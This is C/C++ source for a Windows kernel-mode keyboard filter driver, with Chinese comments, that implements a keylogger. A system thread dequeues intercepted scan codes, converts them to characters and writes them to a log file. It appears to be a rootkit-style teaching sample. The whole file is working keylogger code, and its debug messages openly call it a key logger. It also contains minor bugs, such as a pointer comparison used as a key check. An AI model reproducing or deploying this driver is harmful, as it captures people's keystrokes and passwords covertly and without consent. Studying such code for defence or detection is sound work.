extern "C"
{
	#include "ntddk.h"
}

#include "ntddkbd.h"
#include "Klog.h"
#include "KbdLog.h"
#include "KbdHook.h"
#include "ScanCode.h"

// 中断请求等级 passive
NTSTATUS InitThreadKeyLogger(IN PDRIVER_OBJECT pDriverObject)
{

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	//为设备扩展创建工作线程
	pKeyboardDeviceExtension->bThreadTerminate = false;

	//创建工作线程
	HANDLE hThread;
	NTSTATUS status	= PsCreateSystemThread(&hThread,(ACCESS_MASK)0,NULL,(HANDLE)0,NULL,ThreadKeyLogger,
						pKeyboardDeviceExtension);

	if(!NT_SUCCESS(status))
		return status;

	DbgPrint("Key logger thread created...\n");

	//获取线程对象的指针
	ObReferenceObjectByHandle(hThread,THREAD_ALL_ACCESS,NULL,KernelMode,
		(PVOID*)&pKeyboardDeviceExtension->pThreadObj, NULL);

	DbgPrint("Key logger thread initialized; pThreadObject =  %x\n",
		&pKeyboardDeviceExtension->pThreadObj);

	ZwClose(hThread);

	return status;
}

//中断请求等级为 passive
VOID ThreadKeyLogger(IN PVOID pContext)
{

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
	PDEVICE_OBJECT pKeyboardDeviceOjbect = pKeyboardDeviceExtension->pKeyboardDevice;

	PLIST_ENTRY pListEntry;
	KEY_DATA* kData;

	//主循环体，得到键值
	while(true)
	{
		// 等待可用数据进入队列
		KeWaitForSingleObject(&pKeyboardDeviceExtension->semQueue,Executive,KernelMode,FALSE,NULL);

		pListEntry = ExInterlockedRemoveHeadList(&pKeyboardDeviceExtension->QueueListHead,
												&pKeyboardDeviceExtension->lockQueue);


		if(pKeyboardDeviceExtension->bThreadTerminate == true)
		{
			PsTerminateSystemThread(STATUS_SUCCESS);
		}

		kData = CONTAINING_RECORD(pListEntry,KEY_DATA,ListEntry);

		//转换扫描到的值
		char keys[3] = {0};
		ConvertScanCodeToKeyCode(pKeyboardDeviceExtension,kData,keys);

		//判断键值是否写入文件
		if(keys != 0)
		{
			// 将数据写入文件
			if(pKeyboardDeviceExtension->hLogFile != NULL)
                                                        //判断文件是否有效
			{
				IO_STATUS_BLOCK io_status;
				DbgPrint("Writing scan code to file...\n");

				NTSTATUS status = ZwWriteFile(pKeyboardDeviceExtension->hLogFile,NULL,NULL,NULL,
					&io_status,&keys,strlen(keys),NULL,NULL);

				if(status != STATUS_SUCCESS)
						DbgPrint("Writing scan code to file...\n");
				else
					DbgPrint("Scan code '%s' successfully written to file.\n",keys);
			}
		}
	}
	return;
}//ThreadLogKeyboard

